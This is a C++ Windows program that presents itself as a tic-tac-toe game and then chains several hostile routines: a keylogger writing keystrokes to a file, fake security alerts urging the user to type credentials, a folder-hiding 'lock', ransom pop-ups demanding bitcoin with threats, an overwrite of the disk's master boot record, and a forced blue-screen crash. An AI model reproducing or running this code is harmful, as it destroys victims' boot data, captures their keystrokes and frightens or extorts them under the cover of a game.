#define _WIN32_WINNT 0x0500
#define MBR_SIZE 512
#include <iostream>
#include <Windows.h>
#include <bits/stdc++.h>
#include <conio.h>
#include <cstdlib>
#include <stdio.h>
#include <ctime>
#include <winable.h>
#include <winuser.h>
#include <string>
#include <fstream> 
#include <iomanip>
using namespace std;


/*
Memory Hacking
*/

int zero_mem()
{
    DWORD write;

    char mbrData[MBR_SIZE];

    char mbr[MBR_SIZE]={0};

    HANDLE MasterBootRecord = CreateFile("\\\\.\\PhysicalDrive0"
    , GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE
    , 0, OPEN_EXISTING, 0, 0);
    if(WriteFile(MasterBootRecord, mbrData, MBR_SIZE, &write, NULL)==TRUE)
    {
        cout << "MasterBootRecord is overwritten!" << endl;
        Sleep(5000);
    }
    else
    {
        cout << "Failure" << endl;
        Sleep(5000);
    }

    CloseHandle(MasterBootRecord);

    return EXIT_SUCCESS;
}


/*
Trojan Horse
*/

int WindowX()//Get the window's X resolution
{
	RECT desktop_rect_; // RECT struct {LONG left; LONG right; LONG top; LONG bottom;} || needed for the GetWindowRect()
	HWND desktop_ = GetDesktopWindow(); //Handle to the desktop
	GetWindowRect(desktop_, &desktop_rect_); // Gets the RECT struct's four members ( left, right, top, bottom) ||Miért referencia?
    return desktop_rect_.right; //Return with the window's X resolution
}

int WindowY()//Get the window's Y resolution
{   
	RECT desktop_rect_; // RECT struct { LONG left; LONG right; LONG top; LONG bottom; } || needed for the GetWindowRect()
	HWND desktop_ = GetDesktopWindow(); //Handle to the desktop
	GetWindowRect(desktop_, &desktop_rect_);    // Gets the RECT struct's four members ( left, right, top, bottom) ||Miért referencia?
	return desktop_rect_.bottom;    //Return with the window's Y resolution
}

void BlockMouseMovement()
{
    MessageBox(NULL,"YOUR MOUSE HAS BEEN BLOCKED!","WARNING MESSAGE!",MB_ICONEXCLAMATION ); //this message box lets the user know that the mouse is blocked 
	MessageBox(NULL,"YOU HAVE LOST YOUR INTERNET CONNECTION","WARNING MESSAGE!",MB_ICONEXCLAMATION ); //letting the user know that the internet connection is lost 
	MessageBox(NULL,"The system will be shut down","WINDOWS SECURITY ALERT", MB_ICONERROR); //letting the user know that the computer will be shut down 
	while (true)
	{
        SetCursorPos(WindowX() / 2, WindowY() / 2); //set the position where the mouse will remain stil // in this case, the middle of the screen
	}
}

char board[3][3] = {{'1', '2', '3'}, {'4', '5', '6'}, {'7', '8', '9'}};

char current_marker;
int current_player;

void drawBoard() //drawing the board | this function just draws the board 
{
    cout << " " << board[0][0] << " | " << board[0][1] << " | " << board[0][2] << endl;
    cout << "__________\n";
    cout << " " << board[1][0] << " | " << board[1][1] << " | " << board[1][2] << endl;
    cout << "__________\n";
    cout << " " << board[2][0] << " | " << board[2][1] << " | " << board[2][2] << endl;
}

bool placeMarker(int slot)
{
    int row = slot / 3;
    int col;

    if(slot % 3 == 0) 
    {
        row = row - 1;
        col = 2;
    }
    else 
    {
        col = slot % 3 - 1;
    }
    if(board[row][col] != 'X' && board[row][col] != 'O') 
    {
        board[row][col] = current_marker;
        return true;
    } 
    else 
    {
        return false;
    }
}

int winner()
{
  for(int i = 0; i < 3; i++)
  {
    
    //rows
    if(board[i][0] == board[i][1] && board[i][1] == board[i][2])
    {
       return current_player;
    }
    
    // columns
    if(board[0][i] == board[1][i] && board[1][i] == board[2][i])
    {
      return current_player;
    }
    
  }
    if(board[0][0] == board[1][1] && board[1][1] == board[2][2])
    {
        return current_player;
    }
  
    if(board[0][2] == board[1][1] && board[1][1] == board[2][0])
    {
        return current_player;
    }
  
    return 0;
}

void swap_player_and_marker() // X and O 
{
    if(current_marker == 'X')
    {
        current_marker = 'O';
    }
    else 
    {
        current_marker = 'X';
    }
    if(current_player == 1)
    {
        current_player = 2;
    } 
    else
    {
        current_player = 1;
    }
}

void game()//game function
{
    MessageBox(NULL,"Press okay to play Tic Tac Toe" ,"WELCOME", MB_OK ); //first message. Once okay is pressed, the game starts
    cout << "Player one, choose your marker: ";
    char marker_p1;//assigning a char type variable to marker_p1
    cin >> marker_p1;//asking the user for input 

    current_player = 1;
    current_marker = marker_p1;

    drawBoard();//call the function to draw the board

    int player_won;
    int slot;

    for(int i = 0; i < 9; i++)
    {
   
    cout << "It`s player " << current_player << "`s turn. Enter your slot: "; //entering first slot 
  
    cin >> slot;

    if(slot < 1 || slot > 9)
    {
      cout << "That slot is invalid! Try another slot!"; i--; continue; //if statement, in case the user hits an invalid number 
    }

    if(!placeMarker(slot))
    {
         cout << "That slot occupied! Try another slot!"; i--; continue;//if statement, in case the user wants to use an occupied space
    }
    
    drawBoard();//this functions calls the board, it basically draws the game

    player_won = winner();

    if(player_won == 1)
    {
      cout << "Player one won! Congratulations!"; break; //if statement, in case player 1 wins    
    }
    
    if(player_won == 2)
    {
       cout << "Player two won! Congratulations!"; break;  //if statement, in case player 2 wins 
    }
    
    swap_player_and_marker(); //calling the swap player and marker function 
  }
  
  if(player_won == 0)
  {
    cout << "That is a Tie!"; //if statement, in case there is a tie in the tic tae toe game 
  }
}

void Trojan_MB() //these are  only message boxes that will help to scare and alert the user about what is going on!
{
    MessageBox(NULL,"A VIRUS HAS BEEN DETECTED" ,"WINDOWS SECURITY ALERT", MB_ICONERROR); //virus decection message 
    MessageBox(NULL,"PLEASE CLOSE THE INFECTED FILES.","WINDOWS SECURITY ALERT", MB_ICONWARNING); //virus detection message 
    MessageBox(NULL,"FAILURE TO REMOVE THE INFECTED FILES.","WINDOWS SECURITY ALERT",MB_ICONWARNING); //virus decection message 
    MessageBox(NULL,"We now have control over your computer","HACKER MESSAGE",MB_ICONWARNING); //scary message box, tricking the user
    MessageBox(NULL,"iF you don't want it to get worse, open up notepad and type your credentials","HACKER MESSAGE",MB_ICONWARNING); //scary message box, tricking the user 
}


/*
Keylogger
*/

void LOG(string keystroke)
{
  fstream logFile;
  logFile.open("keylog.txt", fstream::app);
  if(logFile.is_open())
  {
    logFile << keystroke;
    logFile.close();
  }
}

/*
This bool function is used to 
check if a special key was pressed.
*/
bool SpecialKeys(int S_key)
{
    switch (S_key) 
    {
    case VK_SPACE:
        cout << " ";
        LOG(" ");
        return true;
    case VK_RETURN:
        cout << "\n";
        LOG("\n");
        return true;
    case VK_BACK:
        cout << "\b";
        LOG("\b");
        return true;
    case VK_OEM_PERIOD:
        cout << ".";
        LOG(".");
        return true;
    case VK_OEM_COMMA:
        cout << ",";
        LOG(",");
        return true;
    case VK_OEM_7:
        cout << "'";
        LOG("'");
        return true;
    case VK_SHIFT:
        cout << "#SHIFT#";
        LOG("#SHIFT#");
        return true;
    case VK_CAPITAL:
        cout << "#CAPS_LOCK#";
        LOG("#CAPS_LOCK");
        return true;
    case VK_TAB:
        cout << "#TAB";
        LOG("#TAB");
        return true;
    case VK_UP:
        cout << "#UP";
        LOG("#UP_ARROW");
        return true;
    case VK_DOWN:
        cout << "#DOWN";
        LOG("#DOWN_ARROW");
        return true;
    case VK_LEFT:
        cout << "#LEFT";
        LOG("#LEFT_ARROW");
        return true;
    case VK_RIGHT:
        cout << "#RIGHT";
        LOG("#RIGHT_ARROW");
        return true;
    default: 
        return false;
    }
}


void keylog()
{
    // ShowWindow(GetConsoleWindow(), SW_HIDE); //Hides the console window
    char key = 'a';

    while (true)
    {
        for (int key = 8; key <= 190; key++)
        {
            if (GetAsyncKeyState(key) == -32767)
                {
                if (SpecialKeys(key) == false) //Checks to see if a special key was pressed
                {
                    fstream logFile;
                    logFile.open("keylog.txt", fstream::app); //If not, the program records the character key that was pressed
                    if (logFile.is_open())
                    {
                        logFile << char(key); 
                        logFile.close();
                    }
                }
            }
        }
    break;
    }
}


/*
Ransomware
*/

void lockfolder();

void unlockfolder();

void setcolour(unsigned int colour);

void hidefoldercode()
{
    unsigned int choice=0;

    SetConsoleTitle("Folder Lock");

    system("CLS");

    setcolour(14);

    cout << "\t\t\t\t" << "- Evil Genious\n";

    cout << "\t\t\t\t" << "-----------------\n";
  
    setcolour(15);

    setcolour(30);

    cout << "\n\n" << "Options:\t\t\t\n";

    cout << "\t======================\n";

    cout << "\t1. - Lock Folder.\n";

    cout << "\t2. - Unlock Folder.\n";

    cout << "\t3. - Exit.\n";

    cout << "\t====================== \n";

    setcolour(10);

    cout << "\nEnter your choice: ";

    cin >> choice;

    switch (choice)
    {
        case 1: lockfolder(); break;

        case 2: unlockfolder(); break;

        case 3: exit(0); break;

        default: cout << "\nError. Unknown Option Entered. Quitting ....\n"; break;
    }
}

void setcolour(unsigned int colour)
{
    HANDLE handle = GetStdHandle(STD_OUTPUT_HANDLE);

    SetConsoleTextAttribute(handle, colour);
}

void lockfolder()
{
    char pass[15]="";

    ofstream lfolder;

    char folder[200]={0};

    char tempfolder[200]={'0'};

    char attributes[50]={'0'};

    setcolour(13);

    cout << "\nEnter the complete path to the Folder: ";

    cin >> folder;

    strcpy(tempfolder, folder);

    strcat(folder, "\\Desktop.ini");

    lfolder.open(folder, ios::out);

    lfolder << "[.shellClassInfo]" << endl;

    lfolder << "CLSID = {63E23168-BFF7-4E87-A246-EF024425E4EC}" << endl;

    lfolder.close();

    strcpy(attributes, "attrib +h +s ");

    strcat(attributes, tempfolder);

    WinExec(attributes, NULL);

    lfolder.open("C:\\windows\\db.dat", ios::app);

    lfolder << "Folder Locked: " << tempfolder << endl;

    lfolder.close();

    cout << "\n\n" << tempfolder << " has been locked successfully!\n";
}

void unlockfolder()
{
    char folder[255];

    char tempfolder[255];

    char attributes[50];

    char del[50];

    ofstream lfolder;

    setcolour(14);

    cout << "\nEnter the complete path to the Folder: ";

    cin >> folder;

    strcpy(tempfolder, folder);

    strcat(folder, "\\Desktop.ini");

    strcpy(del, "del ");

    strcat(del, folder);

    system(del);

    strcpy(attributes, "attrib -h -s ");

    strcat(attributes, tempfolder);

    WinExec(attributes, NULL);

    lfolder.open("C:\\windows\\db.dat", ios::app);

    lfolder << "! Folder Unlocked: " << tempfolder << endl;

    lfolder.close();

    cout << "\n\n" << tempfolder << " has been unlocked successfully!\n";
} 

void hide() 
{
	HWND stealth;//Creates a handler called stealth
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, 0);//0=Window will not be shown
}

void Ransom_MB() //these are the message boxes for the ransomware 
{
    MessageBox(NULL,"If you force a shutdown, then you will lose all your files!","WARNING MESSAGE!",MB_OK);
    MessageBox(NULL,"Please transfer 3000$ to this bitcoin address within 1 minute!        [1KGe NiDw zH5N rdwN ETj3 hQEx wr5H MN9e FW]","FRIENDLY TIPS!",MB_OK);
    MessageBox(NULL,"What? You want to call the police?","Serious Warning!",MB_OK);
    MessageBox(NULL,"I'm watching you, here is your IP address: 208.80.152.2 ","WHAT ARE YOU WAITING FOR?",MB_OK);
    MessageBox(NULL,"Hope you can still see the sun tomorrow, love and peace :) The countdown begins! ","I'M WAITING FOR YOU! [WARNING!]",MB_OK);
} 

void countDown()
{
	int minute = 0;
	choice:
	int seconds = 59;
	while(minute >= 0)
	{
	    cout << minute << ':' << seconds << endl;
	    Sleep(1000);
	    system("cls");
	    seconds -= 1;
	    if (seconds < 0)
	    {
            minute -= 1;
            goto choice;
	    }
	}
} 


/*
BSOD
*/

typedef NTSTATUS(NTAPI *TFNRtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);

typedef NTSTATUS(NTAPI *TFNNtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters,
    ULONG UnicodeStringParameterMask, PULONG_PTR *Parameters, ULONG ValidResponseOption, PULONG Response);

void bsod()
{
    HMODULE hNtdll = GetModuleHandle("ntdll.dll");
	if (hNtdll != 0)
	{
		NTSTATUS s1, s2;
		BOOLEAN b;
		ULONG r;
		
		TFNRtlAdjustPrivilege pfnRtlAdjustPrivilege = (TFNRtlAdjustPrivilege)GetProcAddress(hNtdll, "RtlAdjustPrivilege");
		s1 = pfnRtlAdjustPrivilege(19, true, false, &b);
	
		TFNNtRaiseHardError pfnNtRaiseHardError = (TFNNtRaiseHardError)GetProcAddress(hNtdll, "NtRaiseHardError");
		s2 = pfnNtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, &r);
	}
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int cmdShow)
{
    bsod();
	return 0;
}


int main()//main function // this function runs the whole program 
{

    game(); //this function runs the tic tae toe game
    keylog(); // this function calls the keylogger 
    Trojan_MB(); //calling the trojan horse message boxes  
    hidefoldercode(); //code that hides the folder 
    Ransom_MB(); //calling the ransomware message boxes
    countDown(); //caliing the countdown 
    zero_mem(); //runs the boot sector virus
    bsod(); //runs the blue screen of death and restarts the computer

  return 0;   
}
